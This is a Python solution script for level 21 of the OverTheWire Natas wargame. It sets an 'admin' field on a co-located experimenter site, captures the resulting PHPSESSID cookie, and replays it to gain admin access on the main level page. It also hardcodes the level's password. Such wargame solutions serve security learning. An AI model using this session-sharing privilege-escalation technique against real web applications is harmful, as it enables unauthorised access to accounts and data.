import requests
from requests.auth import HTTPBasicAuth
from string import ascii_letters
url = "http://natas21.natas.labs.overthewire.org/index.php"
url2 = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php' 
ps21 = 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'
user = 'natas21'
basicAuth=HTTPBasicAuth(user,ps21)
atmp = {
    'admin' : 1,
    'submit': 'Update'
}
session = requests.Session()
r = session.post(url2,auth=basicAuth,data = atmp)
print(r.text)
cookies = session.cookies.get_dict()
phpsessid = "PHPSESSID="+cookies['PHPSESSID']
head = {'Cookie':phpsessid}
r = requests.get(url,headers=head,auth = basicAuth)
print(r.text)
        

